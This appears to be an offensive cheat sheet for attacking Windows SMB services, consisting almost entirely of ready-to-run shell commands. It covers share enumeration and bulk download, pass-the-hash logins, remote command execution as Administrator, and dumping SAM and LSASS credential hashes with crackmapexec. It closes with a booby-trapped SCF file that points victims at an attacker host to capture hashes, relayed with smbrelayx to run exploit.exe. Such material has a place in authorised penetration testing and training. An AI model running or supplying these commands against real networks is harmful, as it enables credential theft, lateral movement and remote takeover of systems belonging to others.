### Enumeration

```shell
nmap -v -Pn -n  -p445,139 --script=smb-enum-* 10.0.0.0/24
enum4linux
```

### List shared folders

```shell
smbmap -H 10.11.1.8 -u fakeuser 
smbclient --no-pass -L //10.11.1.8 # Null user

smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
smbmap -H <IP> [-P <PORT>] #Null user
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
crackmapexec smb <IP> -u '' -p '' --shares #Null user
crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
crackmapexec smb <IP> -u 'username' -H '<HASH>' --shares #Guest user
```

### Download  & Mount Shares
```shell
smbclient \\\\10.11.1.136\\'Bob Share'
```

```shell
mkdir /mnt/a
sudo mount -t cifs //10.11.1.136/'Bob Share' /mnt/a 
df
```

```shell
#Download all
smbclient '//10.11.1.31/Bob Share'
> mask ""
> recurse
> prompt
> mget *
#Download everything to current directory
```

### Execute

```shell
apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute #RID brute
```

### SCF  FILE (IF Writable SMB Shares)

```shell
touch @a.scf

echo "[Shell]
Command=2
IconFile=\\192.168.119.201\\share\Lol
[Taskbar]
Command=ToggleDesktop
" > @a.scf

/usr/share/doc/python3-impacket/examples/smbrelayx.py -e exploit.exe
```
